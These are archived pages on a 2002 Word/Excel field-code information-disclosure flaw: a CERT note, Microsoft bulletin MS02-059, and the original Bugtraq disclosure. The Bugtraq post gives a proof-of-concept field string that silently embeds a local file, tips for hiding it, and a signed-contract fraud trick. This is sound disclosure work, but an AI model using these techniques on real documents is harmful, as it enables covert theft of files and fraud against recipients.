=== Content from www.microsoft.com_ebe8d7c1_20250125_154310.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

# Microsoft Learn. Spark possibility.

Build skills that open doors. See all you can do with documentation, hands-on training, and certifications to help you get the most from Microsoft products.

Search

* ![](/en-us/media/home-and-directory/featured-training_light.jpg?branch=live)
  ![](/en-us/media/home-and-directory/featured-training_dark.jpg?branch=live)

  Learn by doing

  Gain the skills you can apply to everyday situations through hands-on training personalized to your needs, at your own pace or with our global network of learning partners.

  [Take training](/en-us/training/)
* ![](/en-us/media/home-and-directory/featured-documentation_light.jpg?branch=live)
  ![](/en-us/media/home-and-directory/featured-documentation_dark.jpg?branch=live)

  Find technical documentation

  Get tools and step-by-step guidance to help you get the most from Microsoft products such as Azure, Windows, Office, Dynamics, Power Apps, Teams, and more.

  [View documentation](docs/)
* ![](/en-us/media/home-and-directory/featured-cert_light.jpg?branch=live)
  ![](/en-us/media/home-and-directory/featured-cert_dark.jpg?branch=live)

  Showcase your skills

  Advance in your career by completing challenges that demonstrate your expertise. Earn globally recognized and industry-endorsed certifications, and showcase them to your network.

  [Get certified](/en-us/certifications/)
* ![](/en-us/media/home-and-directory/featured-qna_light.jpg?branch=live)
  ![](/en-us/media/home-and-directory/featured-qna_dark.jpg?branch=live)

  Ask questions and get help

  Connect with other learners and experts, ask and answer questions, share resources, and learn together.

  [Explore Q&A](/en-us/answers/products/)
* ![](/en-us/media/home-and-directory/featured-samples_light.jpg?branch=live)
  ![](/en-us/media/home-and-directory/featured-samples_dark.jpg?branch=live)

  Try code samples

  Test out new capabilities in your own projects faster and easier with code samples that bring Microsoft technology to life.

  [See samples](/en-us/samples/browse/)
* ![](/en-us/media/home-and-directory/featured-shows_light.jpg?branch=live)
  ![](/en-us/media/home-and-directory/featured-shows_dark.jpg?branch=live)

  See new ways to innovate

  Discover thousands of fun, authentic, and informative videos by Microsoft and community experts that help you and your team find inventive ways to use technology.

  [Watch shows](/en-us/shows/)

## Level up with Microsoft Learn

* 15%

  On average, certified employees earn 15 percent more than those without certification.

  [Why get certified?](/en-us/certifications/posts/microsoft-learn-why-get-certified)
* 61%

  Upon earning a certification, 61 percent of tech professionals say they earned a promotion.

  [2021 Pearson VUE Value of IT Certification](https://home.pearsonvue.com/voc)
* 90%

  Microsoft-certified developers are 90 percent more productive and nearly 60 percent more efficient.

  [Why get certified?](/en-us/certifications/posts/microsoft-learn-why-get-certified)

## Meet inspirational learners from the community

* ![Ricardo Lessa](/en-us/media/home-and-directory/avatar-Ricardo.jpg?branch=live)

  Ricardo Lessa

  Pre-sales engineer

  "I was able to believe again in the possibility of starting over, updating myself, and returning to the IT market."

  [Read Ricardo's story](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/certifications-can-spark-confidence-amidst-unexpected-changes/ba-p/2038069)
* ![Jacqueline Ye](/en-us/media/home-and-directory/avatar-Jacqueline.jpg?branch=live)

  Jacqueline Ye

  Product manager

  "I want others to know that with some hard work, dedication, and having an always be learning mindset, you can have a fullfilling career."

  [Read Jacqueline's story](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/how-microsoft-learn-advance-women-in-tech/ba-p/2038068)
* ![Charles-Henri Sauget](/en-us/media/home-and-directory/avatar-Charles-Henri.jpg?branch=live)

  Charles-Henri Sauget

  Data platform and technical leader

  "Certifications have really helped me earn my customer's trust as a consultant."

  [Read Charles-Henri's story](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/continue-staying-ahead-with-microsoft-certifications/ba-p/2038070)

![](/en-us/media/home-and-directory/section-testimonials_light.jpg?branch=live)
![](/en-us/media/home-and-directory/section-testimonials_dark.jpg?branch=live)

## Find additional resources

* [Startups](https://www.microsoft.com/startups?wt.mc_id=learn_startupmodule_webpage_cnl)

  Radically accelerate innovation with free access to industry-leading AI services, OpenAI credits, expert guidance, and the essential technology needed to build a startup through Microsoft for Startups Founders Hub.
* [Student Hub](/en-us/training/student-hub/)

  Learn technical skills to prepare you for your future. Find training, virtual events, and opportunities to connect with the Microsoft student developer community.
* [Educator Center](/en-us/training/educator-center/)

  Dive deep into learning with interactive lessons, earn professional development hours, acquire certifications and find programs that help meet your goals.
* [Microsoft Learn Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)

  Get the latest updates, articles, and news for learning content and events from the Microsoft Learn community.
* [Virtual Training Days](https://events.microsoft.com/mvtd)

  Take advantage of free Virtual Training Days, where participants of any skill level can build technical skills across a range of topics and technologies.
* [Microsoft Reactor](https://developer.microsoft.com/en-us/reactor/)

  Whether you're building your career or the next great idea, Microsoft Reactor connects you with the developers and startups that share your goals.

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025



=== Content from www.kb.cert.org_9988677d_20250125_154309.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* Current:  VU#899713

## Microsoft Word and Excel documents allow local file reading by via embedded fields

#### Vulnerability Note VU#899713

Original Release Date: 2002-10-17 | Last Revised: 2002-10-28

---

### Overview

Microsoft Word and Excel contain special encoding tags for formatting and updating content. An attacker may be able to use these tags to exploit an information disclosure vulnerability.

### Description

| Microsoft Word and Microsoft Excel are applications that ship as part of the Microsoft Office distribution. Microsoft Word (all versions) and Microsoft Excel 2002 contain special encoding tags that can be used to update or include text in a document or spreadsheet. In Microsoft Word, these tags are known as field codes. In Microsoft Excel, they are known as external updates. Some of these tags can enable an attacker to embed local information into a document and have it returned via a web site. Likewise, if the victim were to open a document and then return it to the attacker, sensitive information could be included in the document. In order to successfully exploit this vulnerability, the attacker would have to know the path of the target file, and trick the victim into opening the malicious document. |
| --- |

### Impact

| An attacker may be able to gather sensitive data stored on the victim's machine. |
| --- |

### Solution

| Microsoft has release [Security Bulletin MS02-059](http://www.microsoft.com/technet/security/bulletin/MS02-059.asp) to address this vulnerability. |
| --- |

### Vendor Information

899713
Filter by status:
All
Affected
Not Affected
Unknown

Filter by content:
 Additional information available

 Sort by:
Status
Alphabetical

Expand all

**Javascript is disabled. Click [here](/vuls/vendor/VU%23899713/) to view vendors.**
### [Microsoft Corporation](#JARL-5EZQUX) Affected

Updated:  October 17, 2002

### Status

Affected

### Vendor Statement

Please see [Microsoft Security Bulletin MS02-059](http://www.microsoft.com/technet/security/bulletin/MS02-059.asp).

### Vendor Information

The vendor has not provided us with any further information regarding this vulnerability.

### Addendum

The CERT/CC has no additional comments at this time.

If you have feedback, comments, or additional information about this vulnerability, please send us email.

### CVSS Metrics

| Group | Score | Vector |
| --- | --- | --- |
| Base |  |  |
| Temporal |  |  |
| Environmental |  |  |

### References

* <http://www.securitybugware.org/NT/5662.html>
* <http://www.microsoft.com/technet/security/bulletin/MS02-059.asp>
### Acknowledgements

Thanks to Microsoft and Alex Gantman for reporting this vulnerability.

This document was written by Jason A Rafail.

### Other Information

| **CVE IDs:** | [CVE-2002-1143](http://web.nvd.nist.gov/vuln/detail/CVE-2002-1143) |
| --- | --- |
| **Severity Metric:** | 0.61 |
| **Date Public:** | 2002-08-27 |
| **Date First Published:** | 2002-10-17 |
| **Date Last Updated:** | 2002-10-28 15:41 UTC |
| **Document Revision:** | 17 |

* [About vulnerability notes](https://vuls.cert.org/confluence/display/VIN/Vulnerability%2BNote%2BHelp)
* Contact us about this vulnerability
* [Provide a vendor statement](https://vuls.cert.org/confluence/display/VIN/Case%2BHandling#CaseHandling-Givingavendorstatusandstatement)

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

Â©2022 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800



=== Content from docs.microsoft.com_924273f9_20250125_154311.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

Exit focus mode

Read in English

Save

Table of contentsRead in English

Save

Add to plan
[Edit](https://github.com/MicrosoftDocs/security-updates/blob/live/security-updates/SecurityBulletins/2002/ms02-059.md "Edit This Document")

---

#### Share via

Facebook
x.com
LinkedIn
Email

---

Print

Table of contents

* Article
* 03/01/2023
* 6 contributors

Feedback

## In this article

Security Bulletin

# Microsoft Security Bulletin MS02-059 - Moderate

## Flaw in Word Fields and Excel External Updates Could Lead to Information Disclosure (Q330008)

Published: October 16, 2002 | Updated: July 24, 2003

**Version:** 1.2

**Originally posted:** Oct 16, 2002

**Updated:** July 24th, 2003

#### Summary

**Who should read this bulletin:**
Customers using MicrosoftÂ® Word or MicrosoftÂ® Excel.

**Impact of vulnerability:**
Information Disclosure

**Maximum Severity Rating:**
Moderate

**Recommendation:**
Customers using Word or Excel should apply the patches.

**Affected Software:**

* Microsoft Word 2002
* Microsoft Word 2000
* Microsoft Word 97
* Microsoft Word 98(J)
* Microsoft Word X for Macintosh
* Microsoft Word 2001 for Macintosh
* Microsoft Word 98 for Macintosh
* Microsoft Excel 2002

### General Information

## Technical details

**Technical description:**

Word and Excel provide a mechanism through which data from one document can be inserted to and updated in another document. This mechanism, known as field codes in Word and external updates in Excel, can be automated to reduce the amount of manual effort required by a user. An example of the use of Word field codes could be the automatic insertion of a standard disclaimer paragraph in a legal document. An example of the use of external updates in Excel could be the automatic updating of a chart in one spreadsheet using data in a different spreadsheet.

A vulnerability exists because it is possible to maliciously use field codes and external updates to steal information from a user without the user being aware. Certain events can trigger field code and external update to be updated, such as saving a document or by the user manually updating the links. Normally the user would be aware of these updates occurring, however a specially crafted field code or external update can be used to trigger an update without any indication to the user. This could enable an attacker to create a document that, when opened, would update itself to include the contents of a file from the user's local computer.

In order for an attacker to take advantage of this vulnerability, the attacker would need to perform the following steps:

* Craft a Word or Excel document that exploits the vulnerability
* Deliver it to the user, via email or some other method
* Entice the user to open the document
* Return the document to the attacker. (Microsoft is aware of one case in which it would not be necessary for the user to do this. There is one method through which the attacker's document could post information directly to a web site, but it would only allow the first line of the file to be sent)

**Mitigating factors:**

* The attacker would need to know the location of the file that he or she wanted to steal. If the correct filename were not presented, the attack would fail and an invalid field error message would be present in the document.
* The user could always view the field codes or external updates. The field codes or external updates used in the attack can be revealed, as they are only hidden to prevent cluttering the document when it is being viewed or edited. A method of checking documents for additional undesired information is described in the Frequently Asked Questions below.
* Although the attacker could take some steps to obscure the stolen information, the attacker would leave a clear audit trail. Since the field codes or external updates can be viewed, even if an attack is successful, the attacker would leave clear evidence in the document in the form of the stolen information and the malicious field codes used. This evidence could be used by law enforcement agencies if required
* The vulnerability would not enable the attacker to delete, modify or add any files to the user's local system.
* In virtually all circumstances, the attacker would need to entice the user into returning the document. No information would be revealed unless the user returned the document to the attacker.

**Severity Rating:**

|  | Internet Servers | Intranet Servers | Client Systems |
| --- | --- | --- | --- |
| **Word (all versions)** | None | None | Moderate |
| **Excel 2002** | None | None | Moderate |

The above [assessment](https://go.microsoft.com/fwlink/?linkid=21140) is based on the types of systems affected by the vulnerability, their typical deployment patterns, and the effect that exploiting the vulnerability would have on them.

**Vulnerability identifier:** [CAN-2002-1143](https://cve.mitre.org/cgi-bin/cvename.cgi?name=can-2002-1143)

**Tested Versions:**

Microsoft tested Word 2002, Word 2000, Word 98(J), Word 97, Word X for Macintosh, Word 2001 for Macintosh, Word 98 for Macintosh, Excel 2002, Excel 2000, Excel 97, Excel X for Macintosh, Excel 2001 for Macintosh and Excel 98 for Macintosh to assess whether they are affected by these vulnerabilities. Previous versions are no longer [supported](https://support.microsoft.com/directory/discontinue.asp), and may or may not be affected by these vulnerabilities.

## Frequently asked questions

**What's the scope of the vulnerability?**

This vulnerability could enable an attacker to create a document that could be used to steal the contents of a document that another user has access to.
Under virtually all circumstances it would not be possible for an attacker to exploit the vulnerability without the involvement of the user. In order for an attacker to take advantage of this vulnerability, the attacker would have to craft a malicious Word or Excel document, deliver to the user (via email or other means) and then entice the user to return the document. Even a successful attack would leave tell-tale evidence that could aid law enforcement in identifying the attacker.

**What products does this affect?**

The issue affects all versions of Word including when Word is used as the e-mail editor by Microsoft Outlook. Excel 2002 is also affected.

**What causes the vulnerability?**

By design, field codes and external updates can be used to insert data from other sources into Word documents and Excel spreadsheet. Normally the user is aware of these updates occurring. However a flaw in the way field codes and external updates is implemented could make it possible to craft a malicious field code or external updates that, when the document or spreadsheet is opened, will automatically update without the user being aware

**What are field codes and external updates?**

Field codes and external updates are ways of automating the insertion of data in a document. For example, field codes are often used in a Word document to insert the date or page number automatically. External updates in Excel are similar, and can be used for example to insert data from one Excel spreadsheet into another automatically.
Field codes and external updates typically are hidden from view during normal document editing, so as not to clutter the user's view. However they can be revealed and inspected at any time, if necessary. Field codes and external links cannot be permanently hidden in a document to the extent that they cannot be revealed later.

**What's wrong with the way Word field codes and Excel external updates are implemented?**

By design, field codes and external updates can automatically insert and update information from external sources, including data files on the user's system. This is normally legitimate automation on the user's behalf. However, a flaw exists because this update behavior can be manipulated so that a hidden field code can carry out an update without the user being aware. This can be used to insert information from a user's document into the attacker's document, without the user being aware.

**What could this vulnerability enable an attacker to do?**

The vulnerability could enable the attacker to steal the contents of a user's document without the user being aware

**How could an attacker exploit this vulnerability?**

There are a number of steps an attacker would have to take in order to execute a successful attack:

* The attacker would have to craft a special Word or Excel document that contained specially crafted Word fields or Excel external updates. These field codes or external updates would need to reference the exact name and location of the file that the attacker wished to steal.
* The attacker would then have to deliver the document to the user via email or some other means, and convince the user to open it
* After closing the document, the user would need to return the document to the attacker. (There is one niche case, discussed below, in which this would not be necessary)

**What's the case in which the user would not have to return the attacker's document?**

There is one limited scenario where an attacker could use a field code to send data directly to a web site under the attacker's control. Although this scenario would eliminate the need for the user to return the attacker's document, it's subject to a significant drawback - it could only be used to obtain the first line from the user's file

**How is Microsoft Outlook affected?**

Microsoft Outlook itself is not affected. However, Outlook 2002 uses Word as its e-mail editor by default. Outlook 2000 and Outlook 97 can be configured to use Word as their e-mail editor. Microsoft Outlook for Macintosh does not use Word as its e-mail editor. If Word is being used as the Outlook e-mail editor, an e-mail message is treated as a document. The Word patch described in this bulletin corrects this issue whether Word is used separately or in conjunction with Outlook.

**Could this vulnerability be used to forge a digitally signed document?**

No, the signature would be invalidated as soon as the maliciously crafted document was opened. This would be evident from inspecting the digital signature. Microsoft Knowledge Base article [Q329228](https://support.microsoft.com/default.aspx?scid=kb;en-us;q329228) discusses how to verify a digital signature in an Office document.

**Is there any way of seeing what an attacker might have stolen?**

Yes there is. It is important to understand that the contents of the stolen document do not become invisible. The attacker may choose to obscure the contents of the stolen document, but the contents will still be visible if all field codes are revealed and the document is inspected. The stolen contents cannot be irreversibly hidden.
Field codes and external updates can be exposed by selecting the following menu options:

* Word 2002, 2000, 97, 98(J): Tools|Options|View then selecting the "Field Codes" box.
* Word X, 2001 for Macintosh: Edit|Preferences|View then selecting the "Field Codes" box.
* Word 98 for Macintosh: Tools|Preferences|View then selecting the "Field Codes" box.
* Excel 2002: Tools|Options|View|Formulas

This evidence, which will always be present, could be used if necessary to pursue disciplinary or legal action against an attacker.

**How can I remove any additional data that is present in a Word or Excel document?**

Microsoft Knowledge Base article [Q223396](https://support.microsoft.com/default.aspx?scid=kb;en-us;q223396) discusses how to check for and remove additional data from Office documents.

**Can I read my e-mail in Outlook using plain text?**

This capability was introduced in Office XP SP1. Microsoft Knowledge Base article [Q307594](https://support.microsoft.com/default.aspx?scid=kb;en-us;q307594) describes how to do this.

**What do the patches do?**

The Word patch changes the default behavior in Word to prevent those fields that insert data from sources external to the current document, from updating automatically, without direct user interaction to force such an update for those fields. This puts the user in control of whether the update is allowed to proceed. The Excel 2002 patch prompts the user in the one situation where Excel 2002 will not request the user's permission to refresh external updates.

**I'm a network administrator and I'd like to deploy the patch to my users, rather than requiring them each to visit the OfficeUpdate site. Is there a way to do this?**

I'm a network administrator and I'd like to deploy the patch to my users, rather than requiring them each to visit the OfficeUpdate site. Is there a way to do this? Yes. An administrative update is available that will let you do this. To download the administrative update, just visit the download location for the appropriate version of Word and Excel. Links to the administrative update are provided on the download pages.

## Patch availability

**Download locations for this patch**

* Microsoft Word 2002:

  [https://www.microsoft.com/download/details.aspx?FamilyID=6BDB7B4C-B6D8-4554-B28C-C4A5969FDD4F&displaylang;=EN](https://www.microsoft.com/download/details.aspx?familyid=6bdb7b4c-b6d8-4554-b28c-c4a5969fdd4f&displaylang;=en)

  [https://www.microsoft.com/office/ork/xp/journ/Wrd1005a.htm](https://www.microsoft.com/office/ork/xp/journ/wrd1005a.htm) (administrative update only)
* Microsoft Word 2000:

  [https://www.microsoft.com/download/details.aspx?FamilyID=5C011C70-47D0-4306-9FA4-8E92D36332FE&displaylang;=EN](https://www.microsoft.com/download/details.aspx?familyid=5c011c70-47d0-4306-9fa4-8e92d36332fe&displaylang;=en)
* Word 97/Word 98(J):

  Information on receiving Word 97 & Word 98(J) support is available at: [https://support.microsoft.com/default.aspx?scid=kb;EN-US;Q330080](https://support.microsoft.com/default.aspx?scid=kb;en-us;q330080)
* Word X for Macintosh:

  [https:](https://)
* Word 2001 for Macintosh:

  </https:>[https:](https://)
* Word 98 for Macintosh:

  </https:>[https:](https://)
* Excel 2002:

  [https://www.microsoft.com/download/details.aspx?FamilyID=09708964-A8D6-4F4E-9D82-280E08F36E8A&displaylang;=EN](https://www.microsoft.com/download/details.aspx?familyid=09708964-a8d6-4f4e-9d82-280e08f36e8a&displaylang;=en)

  [https://www.microsoft.com/office/ork/xp/journ/Exc1003a.htm](https://www.microsoft.com/office/ork/xp/journ/exc1003a.htm) (administrative update only)

#### Additional information about this patch

**Installation platforms:**

* The Word 2002 patch can be installed on systems running Word 2002 with Office XP [Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=1a8ce553-ab76-4a63-99da-b4ed914c1514&displaylang;=en). (The [administrative update](https://www.microsoft.com/office/ork/xp/journ/wrd1005a.htm) can be installed on systems running Office 2002 [Service Pack 1](https://www.microsoft.com/download/details.aspx?familyid=d4d8a9a4-31fc-480b-9cd9-adccb6997ce3&displaylang;=en) as well).
* The Word 2000 patch can be installed on systems running Word 2000 with Office 2000 [Service Release 1](https://www.microsoft.com/download/details.aspx?familyid=af6c8d03-7633-45b4-ab96-795ee656f2a2&displaylang;=enx) or [Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=96df48a9-7638-429e-816e-35f16f6528ca&displaylang;=en)
* The Word 98(J) patch can be installed on systems running Microsoft Word 98(J) Gold or any Word 98(J) service release, but is only supported on Word 98(J) [Service Release 2b](https://www.microsoft.com/download/details.aspx?familyid=befd7842-602e-42b0-89d2-6be39f1167c1&displaylang;=enx)
* The Word 97 patch can be installed on systems running Microsoft Word 97 Gold or any Word 97 service release, but is only supported on Word 97 [Service Release 2b](https://www.microsoft.com/download/details.aspx?familyid=befd7842-602e-42b0-89d2-6be39f1167c1&displaylang;=en)
* The Word X for Macintosh patch can be installed on systems running the latest version of Office v.X. To determine the latest version of Office, look at </https:>[https:](https://)
* The Word 2001 for Macintosh patch can be installed on systems running the latest version of Office 2001. To determine the latest version of Office, look at </https:>[https:](https://)
* The Word 98 for Macintosh patch can be installed on systems running the latest version of Office 98. To determine the latest version of Office, look at </https:>[https:](https://)
* The Excel 2002 patch can be installed on systems running Excel 2002 with Office XP [Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=1a8ce553-ab76-4a63-99da-b4ed914c1514&displaylang;=en). (The [administrative update](https://www.microsoft.com/office/ork/xp/journ/exc1003a.htm) can be installed on systems running Office 2002 [Service Pack 1](https://www.microsoft.com/download/details.aspx?familyid=d4d8a9a4-31fc-480b-9cd9-adccb6997ce3&displaylang;=en) as well).

**Inclusion in future service packs:**

The fix for this issue will be included in any future service packs for the affected products.

**Reboot needed:** No

**Patch can be uninstalled:** No

**Superseded patches:** None.

**Verifying patch installation:**

* Word 2002: Verify that the version number of Winword.exe is 10.0.4524.0
* Word 2000: Verify that the version number of Winword.exe is 9.00.00.6926
* Word 97/Word 98(J): Information on checking Word 97/Word 98(J) is available at: [https://support.microsoft.com/default.aspx?scid=kb;EN-US;Q330080](https://support.microsoft.com/default.aspx?scid=kb;en-us;q330080)
* Word X for Macintosh: Information on checking Word X for Macintosh is available at: </https:>[https:](https://)
* Word 2001 for Macintosh: Information on checking Word 2001 for Macintosh is available at: </https:>[https:](https://)
* Word 98 for Macintosh: Information on checking Word 98 for Macintosh is available at: </https:>[https:](https://)
* Excel 2002: Verify that the version number of Excel.exe is 10.0.4524.0

**Caveats:**

None

**Localization:**

Localized versions of this patch are available at the locations discussed in "Patch Availability".

**Obtaining other security patches:**

Patches for other security issues are available from the following locations:

* Security patches are available from the [Microsoft Download Center](https://go.microsoft.com/fwlink/?linkid=21129), and can be most easily found by doing a keyword search for "security\_patch".
* Patches for consumer platforms are available from the [WindowsUpdate](https://windowsupdate.microsoft.com/) web site

#### Other information:

**Support:**

* Microsoft Knowledge Base article Q330008 discusses this issue and will be available approximately 24 hours after the release of this bulletin. Knowledge Base articles can be found on the [Microsoft Online Support](https://support.microsoft.com/?scid=fh;en-us;kbhowto) web site.
* Technical support is available from [Microsoft Product Support Services](https://support.microsoft.com/directory/question.asp?sd=gn&fr;=0). There is no charge for support calls associated with security patches.

**Security Resources:** The [Microsoft TechNet Security](https://www.microsoft.com/technet/security/default.mspx) Web Site provides additional information about security in Microsoft products.

**Disclaimer:**

The information provided in the Microsoft Knowledge Base is provided "as is" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.

**Revisions:**

* V1.0 (October 16, 2002): Bulletin Created.
* V1.1 (October 17, 2002): Updated to clarify that the Word 2002 patch can be applied to systems running Word 2002 Service Pack 1 using the administrative update.
* V1.2 {July 24, 2003): Updated Mac download links.

*Built at 2014-04-18T13:49:36Z-07:00*
</https:>

---

## Additional resources

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025
## Additional resources

### In this article

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025



=== Content from marc.info_7cbae76d_20250125_154208.html ===

```
[[prev in list](?l=bugtraq&m=103046781907774&w=2)] [[next in list](?l=bugtraq&m=103046450203569&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=103054818425127&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [Security side-effects of Word fields](?t=103040006700005&r=1&w=2)
From:       [Alex Gantman <agantman () qualcomm ! com>](?a=103040016600002&r=1&w=2)
Date:       [2002-08-26 21:23:22](?l=bugtraq&r=1&w=2&b=200208)
[Download RAW [message](?l=bugtraq&m=103040003014999&q=mbox) or [body](?l=bugtraq&m=103040003014999&q=raw)]

I have stumbled onto a couple potential security issue in Microsoft Word.  In both \
cases the adversary (mis)uses fields to perpetrate the attack.  It's important to \
note that fields are not macros and, as far as I know, cannot be disabled by the \
user.  I am providing a basic description along with a proof-of-concept demo.  I am \
fairly certain that someone with free time and imagination can expand on these \
principles, possibly applying them to other products.

Following tradition I'll use Alice and Bob as the two parties involved.  Alice will \
be the adversary.

1) Document collaboration spyware.
Attack Basics:  Alice sends Bob a Word document for revisions.  After Bob edits, \
saves, and mails it back to Alice the file will also include contents of another \
file(s) from Bob's computer that Alice has specified a priori.  To achieve this, \
Alice embeds the INCLUDETEXT field into the document.  The field results in inclusion \
of a specified file into the current document.  Of course, Alice must be careful \
include it in such a way that it does not become apparent to Bob.  Alice can do all \
the usual things like hidden text, small white font, etc.  Alternatively (and in my \
opinion cleaner, she can embed the INCLUDETEXT field within a dummy IF field that \
always returns an empty string.  In this case, the only way Bob can notice the \
included file is if he goes browsing through field codes.

Attack Improvements:
The disadvantage of the basic attack is that Alice must rely on Bob to update the \
INCLUDETEXT field to import the file.  If the document is large and contains tables \
of contents, figures, etc. then Bob is very likely to update all the fields.  \
However, Alice would like to make sure that the field gets updated regardless of \
whether Bob does it manually or not.  Automatic updates can be forced if a DATE field \
is embedded into the INCLUDETEXT and it is the last date field in the document (don't \
ask me why).

Proof of concept:
Inserting the following field structure into the footer of the last page will steal \
the contents of c:\a.txt on the target's computer.  Keep in mind the plain curly \
braces below must actually be replaced with Word field braces (you can either use the \
menus to insert fields one by one, or ask google how to do it by hand). { IF { \
INCLUDETEXT { IF { DATE } = { DATE } "c:\\a.txt" "c:\\a.txt" }  \* MERGEFORMAT  } = \
"" "" \* MERGEFORMAT }

Countermeasures:
The only thing you can do now is decide how paranoid you want to be.  If you must \
edit and send out a Word file with unknown origins, you may want to manually go \
through the fields.  It would be nice to be able to force user confirmation (via a \
dialog box) for all includes.  Alternatively one could write a scanner.  Of course an \
optional standalone checker will never be used by those most at risk.

2) Oblivious signing
Attack Basics:  Alice and Bob wants to sign a contract saying that Alice will pay Bob \
$100.  Alice types it up as a Word document and both digitally sign it.  In a few \
days Bob comes to Alice to collect his money.  To his surprise, Alice presents him \
with a Word document that states he owes her $100.  Alice also has a valid signature \
from Bob for the new document.  In fact, it is the exact same signature as for the \
contract Bob remembers signing and, to Bob's great amazement, the two Word documents \
are actually identical in hex.  What Alice did was insert an IF field that branched \
on an external input such as date or filename.  Thus even though the sign contents \
remained the same, the displayed contents changed because they were partially \
dependent on unsigned inputs.  The basic point is that very few users know the actual \
contents of their Word documents and it should be obvious that one should never sign \
what one cannot read.  Of course, Bob could contest the contract in court.  An expert \
witness (that's actually an expert) could easily demonstrate that there are unsigned \
inputs and therefore it is not clear which version was actually signed.  Thus Bob can \
get out of the fraudulent contract.  However, the same logic will hold for Alice and \
she gets away without paying Bob $100 she signed for.  Thus, an adversary can build \
in a free escape clause.  Note that I am just speculating about all the legal \
aspects.

